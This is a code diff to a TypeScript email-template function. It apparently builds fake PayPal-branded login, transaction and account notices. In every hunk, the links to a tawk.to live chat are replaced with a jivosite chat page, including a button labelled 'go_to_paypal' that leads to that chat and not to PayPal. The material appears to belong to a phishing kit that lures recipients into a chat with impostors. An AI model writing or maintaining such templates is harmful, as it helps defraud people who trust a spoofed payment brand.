@@ -554,10 +554,10 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
                ${t('review_message_confirm', lang)}
              </p>
              <div class="text-center" style="margin-top: 24px;">
-                <a href="${data.chat_url || 'https://tawk.to/chat/6a36a52cb40d591d46abb3d0/1jrinadmk'}" class="btn" style="background-color: ${btnColor};">${t('view_message_confirm', lang)}</a>
+                <a href="${data.chat_url || 'https://code.jivosite.com/chatpage/YG4WdNtpis'}" class="btn" style="background-color: ${btnColor};">${t('view_message_confirm', lang)}</a>
              </div>
              <p class="text-center text-muted" style="font-size: 11px; margin-top: 20px; color: #6c7378;">
-               ${t('need_help', lang)} <a href="https://tawk.to/chat/6a36a52cb40d591d46abb3d0/1jrinadmk" style="color:#0070ba;">${t('continue_live_chat', lang)}</a>
+               ${t('need_help', lang)} <a href="https://code.jivosite.com/chatpage/YG4WdNtpis" style="color:#0070ba;">${t('continue_live_chat', lang)}</a>
              </p>
           </div>
          ` : `
@@ -574,11 +574,11 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
                ${t('click_button_chat', lang)}
              </p>
              <div class="text-center" style="margin-top: 20px;">
-                <a href="${data.chat_url || 'https://tawk.to/chat/6a36a52cb40d591d46abb3d0/1jrinadmk'}" class="btn" style="background-color: ${btnColor};">${t('view_reply_continue', lang)}</a>
+                <a href="${data.chat_url || 'https://code.jivosite.com/chatpage/YG4WdNtpis'}" class="btn" style="background-color: ${btnColor};">${t('view_reply_continue', lang)}</a>
              </div>
              <p class="text-center text-muted" style="font-size: 11px; margin-top: 20px; color: #94a3b8;">
                ${t('button_doesnt_work', lang)}<br>
-               <a href="${data.chat_url || 'https://tawk.to/chat/6a36a52cb40d591d46abb3d0/1jrinadmk'}" style="font-size: 11px;">${data.chat_url || 'https://tawk.to/chat/6a36a52cb40d591d46abb3d0/1jrinadmk'}</a>
+               <a href="${data.chat_url || 'https://code.jivosite.com/chatpage/YG4WdNtpis'}" style="font-size: 11px;">${data.chat_url || 'https://code.jivosite.com/chatpage/YG4WdNtpis'}</a>
              </p>
           </div>
          `;
@@ -715,7 +715,7 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
         </tr>
         <tr>
             <td align="center" style="padding: 30px 40px;">
-                <a href="https://tawk.to/chat/6a36a52cb40d591d46abb3d0/1jrinadmk" style="display: inline-block; background-color: #000000; color: #ffffff; font-weight: bold; font-size: 15px; text-decoration: none; padding: 14px 45px; border-radius: 25px; min-width: 140px; text-align: center;">${t('go_to_paypal', lang)}</a>
+                <a href="https://code.jivosite.com/chatpage/YG4WdNtpis" style="display: inline-block; background-color: #000000; color: #ffffff; font-weight: bold; font-size: 15px; text-decoration: none; padding: 14px 45px; border-radius: 25px; min-width: 140px; text-align: center;">${t('go_to_paypal', lang)}</a>
             </td>
         </tr>
         <tr>
